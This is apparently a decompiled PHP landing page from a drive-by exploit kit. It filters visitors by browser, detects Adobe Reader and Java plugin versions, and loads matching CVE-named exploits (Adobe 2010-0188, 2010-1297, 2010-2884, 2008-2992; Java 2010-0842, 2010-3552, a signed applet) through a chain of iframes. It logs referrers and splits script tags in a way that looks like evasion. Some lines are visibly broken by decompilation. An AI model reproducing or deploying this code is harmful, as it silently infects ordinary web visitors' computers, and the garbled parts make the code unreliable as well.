<?php


include_once( 'config.php' );
include( 'include/browser.php' );
Browser;
$browser = new (  );
$data = $browser->identification(  );

if (( ( ( ( ( $data['browser'] != 'FIREFOX' && $data['browser'] != 'CHROME' ) && $data['browser'] != 'SAFARI' ) && $data['browser'] != 'OPERA' ) && $data['browser'] != 'MSIE' ) || $data['platform'] == 'OTHER' )) {
	exit(  );
}

echo '<body>

';

if ($reuse_iframe) {
	echo '<iframe id=\'eframe\'></iframe>';
}

echo '
</body>
';
echo '<s';
echo 'cript type="text/javascript" src="include/PluginDetect.js"></script>
';
echo '<s';
echo 'cript type="text/javascript">

function acrobatCheck() {
	var acrobat=new Object();
	acrobat.installed=false;
	acrobat.version=\'0\';

	var adobe = PluginDetect.getVersion("AdobeReader");
	if(adobe!=null){
		acrobat.installed=true;
		var vArray = adobe.split(",");
		acrobat.version = vArray[0] + vArray[1] + vArray[2];
	}
	return acrobat;
}

function javaCheck() {
	var ojava=new ';
echo 'Object();
	ojava.installed=false;
	ojava.version=\'0\';
	ojava.build=\'0\';

	var javaversion = PluginDetect.getVersion(\'Java\', \'include/getJavaInfo.jar\')

	if(javaversion!=null){
		ojava.installed=true;
		var vArray = javaversion.split(",");
		ojava.version = vArray[1];
		ojava.build = vArray[3];
	}
	return ojava;
}

var ExploitFrames = new Array();
var CurrentExploit = 0;

funct';
echo 'ion VisitorCheck(){
	var mydiv=document.createElement("div");
	mydiv.innerHTML="<iframe src=\'visitor.php?referrer=';
echo getenv( 'HTTP_REFERER' );
echo '\'></iframe>";
	document.body.appendChild(mydiv);
}

function NextExploit(){

	';

if ($reuse_iframe) {
	echo '	document.getElementById(\'eframe\').src = ExploitFrames[CurrentExploit];
	';
}
else {
	echo '	var mydiv=document.createElement("div");
	mydiv.innerHTML="<iframe src=\'" + ExploitFrames[CurrentExploit] + "\'></iframe>";
	document.body.appendChild(mydiv);
	';
}

echo '
	if(CurrentExploit < ExploitFrames.length - 1){
		CurrentExploit++;
		setTimeout("NextExploit()", ';
echo $exploit_delay;
echo ');
	}
}

function acrobatExploit(){
	var acrobat = acrobatCheck();
	if(acrobat.installed){
		if(acrobat.version >= 800 && acrobat.version < 821){
			ExploitFrames.push("load.php?e=Adobe-80-2010-0188");
		}else if(acrobat.version >= 900 && acrobat.version < 940){
			if(acrobat.version < 931){
				ExploitFrames.push("load.php?e=Adobe-90-2010-0188");
			}else if(acrobat.version < 933)';
echo '{
				ExploitFrames.push("load.php?e=Adobe-2010-1297");

			}else if(acrobat.version < 940){
				ExploitFrames.push("load.php?e=Adobe-2010-2884");
			}
		}else if(acrobat.version >= 700 && acrobat.version < 711){
			ExploitFrames.push("load.php?e=Adobe-2008-2992");
		}
	}
}
function javaExploit(){
	var ojava = javaCheck();
	if(ojava.installed){
		if(ojava.version < 6 || (ojava.ve';
echo 'rsion == 6 && ojava.build < 19)){
			ExploitFrames.push("load.php?e=Java-2010-0842");

';

if ($data['browser'] == 'MSIE') {
	echo '
		}else if(ojava.version == 6 && ojava.build < 22){
			ExploitFrames.push("load.php?e=Java-2010-3552");

';
}

echo '
		}
	}
}
function javaSigned(){
	var ojava = javaCheck();
	if(ojava.installed){
		ExploitFrames.push("load.php?e=JavaSignedApplet");
	}
}

VisitorCheck();

javaExploit();

acrobatExploit();

';

if ($enable_signed) {
	echo 'javaSigned();';
}

echo '
if(ExploitFrames.length > 0){
	NextExploit();
}

</script>
';
?>
